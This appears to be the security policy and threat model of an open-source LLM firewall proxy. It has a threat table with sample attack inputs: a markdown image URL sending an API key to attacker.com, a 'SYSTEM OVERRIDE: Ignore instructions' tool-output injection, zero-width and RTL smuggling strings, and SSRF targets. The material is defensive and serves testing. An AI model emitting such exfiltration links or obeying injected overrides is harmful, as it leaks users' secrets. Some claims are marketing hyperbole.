# 🔐 Security: Threat Model & Defenses

## 18-Vector Threat Matrix
LLM-Shield-Proxy is an enterprise **LLM Firewall** validated against an exhaustive suite of **78 automated unit, integration, and adversarial fuzzing tests** to ensure continuous **LLM Security Posture Management (LLM SPM)**.

| Threat Vector / Attack Category | Adversarial Payload / Vector | Proxy Defense Mechanism | Verification Status |
| :--- | :--- | :--- | :--- |
| **Streaming Packet Splitting** | 1-character token fragmentation across SSE deltas (`"["`, `"E"`, `"M"`, `"A"`, `"I"`, `"L"`, `"_1]"`). | Sliding-window prefix-overlap retention holding incomplete tokens across packets. | ✅ **PASSED** (`test_extreme_chunk_splitting_sse_evasion`) |
| **Early Stream Termination** | Client aborts or upstream disconnects mid-stream. | Deterministic `finally` buffer flush + upstream connection teardown. | ✅ **PASSED** (`test_rehydrate_sse_stream_generator`) |
| **Unicode Smuggling** | Zero-width spaces (`j​ohn@doe.com`, `555​-44-3333`). | `normalize_and_desmuggle()` removes invisible format characters + NFKC normalization. | ✅ **PASSED** (`test_unicode_zero_width_smuggling`) |
| **BiDi / RTL Override Evasion** | Right-to-Left Override (`‮3333-44-555`). | Directional format controls (`‪-‮`, `⁠-⁩`) stripped before regex matching. | ✅ **PASSED** (`test_bidi_rtl_override_smuggling`) |
| **Base64 Obfuscated PII** | Base64-encoded strings (`TXkgU1NO...`) concealing secrets. | Dual Shannon entropy scanner + base64 candidate payload inspection. | ✅ **PASSED** (`test_base64_obfuscated_pii_injection`) |
| **Markdown Image Exfiltration** | Prompt tricks LLM into outputting `![logo](https://attacker.com/leak?data=[API_KEY])`. | Outbound image sanitizer in `vault.rehydrate()` neutralizes query parameter leak URLs. | ✅ **PASSED** (`test_markdown_image_exfiltration_blocking`) |
| **Tool Response Poisoning** | Malicious API/web results containing `"SYSTEM OVERRIDE: Ignore instructions"`. | `INDIRECT_PROMPT_INJECTION_PATTERN` neutralizes override tokens in `role: "tool"` content. | ✅ **PASSED** (`test_tool_response_indirect_prompt_injection_neutralization`) |
| **JSON Recursion Bomb** | Deeply nested JSON (`{"a": {"a": ...}}` 500 levels deep) attempting stack overflow. | Strict `max_depth = 20` traversal limit returning `400 Bad Request` in `<1ms`. | ✅ **PASSED** (`test_json_bomb_recursion_limit`) |
| **Slowloris Memory Ballooning** | Massive non-terminating streams attempting to exhaust RAM. | Bounded `64KB` buffer backpressure guard + `1MB` SSE line limit. | ✅ **PASSED** (`test_slowloris_buffer_backpressure_limit`) |
| **CJK Sub-Word Collisions** | Continuous Chinese/Japanese text (`我的名字是Maya。`). | Script-aware boundary isolation allowing logographic replacements without whitespace. | ✅ **PASSED** (`test_cjk_multilingual_boundary_safety`) |
| **Multi-Modal Content Arrays** | Multi-part vision message arrays with text and base64 images. | Universal content block unwrapping redacting text without altering image payloads. | ✅ **PASSED** (`test_multimodal_content_array_redaction`) |
| **Timing Attacks on API Keys** | Key length and character leakage via string comparison timing. | Constant-time authentication verification using `hmac.compare_digest()`. | ✅ **PASSED** (`test_inbound_auth_validation`) |
| **SSRF & Network Boundary** | Requests targeting `127.0.0.1`, AWS metadata (`169.254.169.254`), or private LANs. | Dynamic DNS resolution + IP blacklist rejecting loopback, link-local, and multicast IPs. | ✅ **PASSED** (`test_ssrf_rejection`) |
| **Agent-Driven Infinite Loops** | Autonomous agents getting stuck in costly self-reflective loops. | Composite Agent Loop Circuit Breaker (`AGENT_BREAKER_THRESHOLD`). | ✅ **PASSED** (`test_composite_agent_loop_breaker`) |
| **Audit Log Tampering** | Malicious actor modifies logs to cover up PII leak. | WORM-Compliant Merkle Attestation & SHA-256 Hash Chaining. | ✅ **PASSED** (`test_worm_compliant_merkle_chaining`) |
| **Insider Model Leaks** | Employees copying redacted/synthetic data to train local shadow IT models. | Dynamic Canary Watermarking & Steganography. | ✅ **PASSED** (`test_dynamic_canary_watermark_injection`) |
| **Egress Spoofing** | Attacker claims proxy sent PII to upstream provider. | Cryptographic Proof of Non-Egress Merkle Attestation. | ✅ **PASSED** (`test_proof_of_non_egress_attestation`) |
| **Vault Memory Dump** | Attacker gains memory dump of TTL session vault to steal mapped PII. | In-Band Stateless Cryptographic Masking (AES-256-GCM). | ✅ **PASSED** (`test_stateless_crypto_masking_vault_bypass`) |

## Deep Dive: Enterprise Security Features & Implementation

### 🛡️ Core Cryptographic Masking & Defenses

#### Data Loss Prevention (DLP) for LLMs (Synthetic Masking & Entropy)
* **Implementation Details**: Traditional regex fails against unstructured secrets (like Hex or Base64 API keys). We implemented a Tier 2 math-bound $O(N)$ **Shannon Entropy** scanner serving as robust **Data Loss Prevention (DLP) for LLMs**. It computes information density (`H(S) = -Σ p(c) log2 p(c)`). High-entropy tokens are intercepted and swapped deterministically with realistic Faker-based synthetic entities, preserving LLM attention weights while destroying the original sensitive payload. 
* **Flags**: [`ENABLE_TIER2_ENTROPY`](DEPLOYMENT.md), [`ENABLE_SYNTHETIC_SWAPPING`](DEPLOYMENT.md)

#### In-Band Stateless Cryptographic Masking
* **Implementation Details**: Eliminates the need for external session vaults by encrypting sensitive entities directly in the LLM context using **AES-256-GCM** with a 256-bit Data Encryption Key (DEK). The encrypted payload remains mathematically unbreakable upstream and is decrypted seamlessly during the SSE stream return, guaranteeing zero state-leakage.
* **Flags**: [`SHIELD_DEFAULT_MASKING_MODE`](DEPLOYMENT.md), [`SHIELD_ENCRYPTION_KEY`](DEPLOYMENT.md)

#### Stateless Redis TTL Vault & Deterministic HMAC Masking
* **Implementation Details**: Provides flexible anonymization modes. When stateful masking is required, rehydration mappings are pushed to a centralized Redis Vault. Keys are hashed deterministically using HMAC-SHA256, allowing stateless tracking across horizontal proxy replicas without exposing raw data in memory.
* **Flags**: [`REDIS_URL`](DEPLOYMENT.md), [`SESSION_TTL_SECONDS`](DEPLOYMENT.md)

#### Dynamic Canary Watermarking & Steganography (Leak Forensics)
* **Implementation Details**: Injects cryptographically verifiable, invisible canary tokens (via zero-width characters or deterministic synthetic swapping) into the outbound stream. If an employee leaks a response or uses it to train a shadow-IT model, the watermark can be extracted to mathematically prove provenance and identify the exact session/tenant that leaked the data.
* **Flags**: [`ENABLE_WATERMARKING`](DEPLOYMENT.md), [`SHIELD_WATERMARK_SECRET`](DEPLOYMENT.md)

### 🛑 Threat Prevention & Isolation

#### Autonomous Agent Security (Composite Agent Loop Circuit Breaker)
* **Implementation Details**: Enforces **Autonomous Agent Security** by actively monitoring recursive LLM agent executions and composite tool calls. It tracks `tool_calls` array depths and initiates a deterministic circuit break when recursive calls hit a strict threshold, preventing Autonomous Agent DoS attacks and runaway API billing.
* **Flags**: [`ENABLE_AGENT_BREAKER`](DEPLOYMENT.md), [`AGENT_BREAKER_THRESHOLD`](DEPLOYMENT.md)

#### Granular Entity Policy Scopes & Zero Trust AI Defaults
* **Implementation Details**: Ensures strict **AI Governance** by binding incoming requests instantly to department-level security profiles via Virtual Keys. Utilizes $O(1)$ in-memory tenant profile mapping. The system operates on a strict `FAIL_CLOSED` **Zero Trust AI** default—if a policy resolution fails or the engine faults, the **LLM Firewall** drops the connection rather than failing open and leaking data.
* **Flags**: [`VALID_VIRTUAL_KEYS`](DEPLOYMENT.md), [`SHIELD_FAILURE_MODE`](DEPLOYMENT.md)

#### Zero-Allocation Streaming JSON Lexer
* **Implementation Details**: Defends against Slowloris and memory ballooning attacks by utilizing a Rust-backed (`orjson`) zero-allocation lexer. This processes massive multi-megabyte SSE stream lines without spiking the Resident Set Size (RSS), keeping memory strictly bounded below 60MB.
* **Flags**: [`MAX_SSE_LINE_LENGTH`](DEPLOYMENT.md)

### 📜 Audit, Forensics, and Compliance

#### WORM-Compliant Merkle Attestation & Audit Logging
* **Implementation Details**: Emits structured compliance events containing timestamps, tenant IDs, redacted entity types, and session metadata. The logs are Write-Once-Read-Many (WORM) compliant, generating mathematical proof that specific data never egressed the VPC boundaries.
* **Flags**: [`TELEMETRY_ENABLED`](DEPLOYMENT.md)

#### Cryptographic SHA-256 Hash Chaining
* **Implementation Details**: Every emitted audit log entry cryptographically signs and chains to the previous record's hash. This guarantees tamper-evidence; any post-facto modification or deletion of a log entry (e.g., to cover up a leak) will instantly invalidate the entire cryptographic chain, satisfying strict **SOC 2 Compliance for AI**, **ISO 42001 AI Management System** requirements, and HIPAA audit controls.
* **Flags**: [`AUDIT_LOG_FORMAT`](DEPLOYMENT.md)

#### Cryptographic Proof of Non-Egress Merkle Attestation
* **Implementation Details**: Constructs a Merkle Tree of all redacted tokens per session. The proxy provides a cryptographic root hash confirming exactly what was stripped, allowing third-party auditors to verify non-egress without ever seeing the raw sensitive data.

#### FIPS 140-3 KAT & RFC 6902 Differential Audit Logging
* **Implementation Details**: Executes Known Answer Tests (KAT) at startup to verify cryptographic module integrity (FIPS 140-3). Emits logs strictly utilizing RFC 6902 JSON Patch formats to precisely record mutations made to the outbound LLM payload.
* **Flags**: [`FIPS_STRICT_MODE`](DEPLOYMENT.md), [`AUDIT_LOG_FORMAT`](DEPLOYMENT.md)

### 🏗️ Secure Infrastructure & Service Mesh

#### Centralized Enterprise Secrets & mTLS
* **Implementation Details**: Features native HashiCorp Vault integration supporting AppRole, Kubernetes Service Accounts, and Token authentication. Provides a non-blocking TTL cache and enforces strict X.509 mutual TLS (mTLS) transport for backend secret retrieval, ensuring data-in-transit security.
* **Flags**: [`ENABLE_VAULT_SECRETS`](DEPLOYMENT.md), [`ENABLE_MTLS`](DEPLOYMENT.md)

#### Service Mesh Native gRPC ext_proc Integration
* **Implementation Details**: Integrates gracefully into Kubernetes Service Meshes (like Istio/Linkerd) natively without secondary sidecar bottlenecks. By implementing Envoy's External Processing filter (`envoy.service.ext_proc.v3.ExternalProcessor`), it achieves Zero HTTP network hops, streaming buffers directly over highly secure UDS (Unix Domain Sockets).
* **Flags**: [`ENABLE_EXT_PROC`](DEPLOYMENT.md), [`EXT_PROC_SOCK_PATH`](DEPLOYMENT.md)

#### Zero-Dependency Kubernetes Mutating Webhook
* **Implementation Details**: Intercepts Pod deployment manifests directly via a standalone Mutating Webhook to seamlessly inject the LLM-Shield sidecar container and mTLS certificates, requiring zero external dependencies or elevated cluster privileges.

#### Traffic Engineering & Resiliency
* **Implementation Details**: 
  * **Redis Token-Bucket**: Pre-loaded Lua scripts (`evalsha`) handle high-throughput rate limiting to prevent noisy-neighbor DoS.
  * **SIGTERM Draining**: Kubernetes 25s SIGTERM connection draining ensures active SSE streams finish transmission securely during pod termination.
  * **Upstream Key Overriding**: Strips vulnerable client keys and injects internal load-balanced provider API keys dynamically.
* **Flags**: [`ENABLE_RATE_LIMITING`](DEPLOYMENT.md), [`DRAIN_TIMEOUT_SECONDS`](DEPLOYMENT.md), [`OVERRIDE_CLIENT_AUTH`](DEPLOYMENT.md)

#### Deep Component Health Probes and Prometheus Alerts
* **Implementation Details**: Provides granular `/healthz`, `/livez`, and `/readyz` probes covering Redis connectivity and Vault mTLS states to ensure traffic is never routed to a compromised or disconnected node. Integrates directly with Prometheus Alertmanager.
* **Flags**: [`METRICS_BEARER_TOKEN`](DEPLOYMENT.md)

#### Zero-Overhead OpenTelemetry (OTel) Tracing
* **Implementation Details**: Handles W3C `traceparent` distributed tracing propagation via a dedicated asynchronous background thread. Provides full observability to Jaeger or Datadog with strictly zero latency overhead to the active HTTP streaming loop, ensuring security monitoring never degrades LLM performance.
* **Flags**: [`TELEMETRY_ENABLED`](DEPLOYMENT.md)

#### Multi-Provider Translators & Anthropic Adapter
* **Implementation Details**: Acts as an un-bypassable security layer by universally intercepting requests and employing a Zero-SDK OpenAI-to-Anthropic request transformation. It normalizes distinct SSE stream formats at the network edge, ensuring security policies are uniformly applied regardless of the backend LLM provider.
* **Flags**: [`DEFAULT_UPSTREAM_PROVIDER`](DEPLOYMENT.md), [`ANTHROPIC_API_VERSION`](DEPLOYMENT.md)

---

*(Below is the original Security Policy and Vulnerability Reporting Reference)*

# Security Policy & Vulnerability Reporting

## Security Overview
LLM-Shield-Proxy is engineered for extreme zero-egress data privacy and enterprise compliance (SOC 2 / HIPAA). Security and confidentiality are core to the architecture.

## Supported Versions
As an open-source project, **only the absolute latest release version** is actively supported with security updates. 

We do not backport security patches to older versions. If a vulnerability is found and patched (e.g., in `1.x.y`), users on older versions are expected to upgrade to the latest release to secure their environment. The onus is entirely on the user to ensure they are pulling the latest Docker image or PyPI package.

| Version | Supported          |
| ------- | ------------------ |
| Latest  | :white_check_mark: |
| Older Versions | :x:         |

## Reporting a Vulnerability

If you discover a security vulnerability in LLM-Shield-Proxy, please **do not** open a public issue.

Instead, confidentially report the issue directly to the core maintainer:

- **Contact:** Ninad Phalak
- **Email:** `ninad.phalak@gmail.com`

Please include in your report:
- A detailed description of the vulnerability.
- Steps to reproduce or proof-of-concept payload/code.
- Impact assessment.

We aim to respond to security reports within 24–48 hours and release a patch expeditiously.
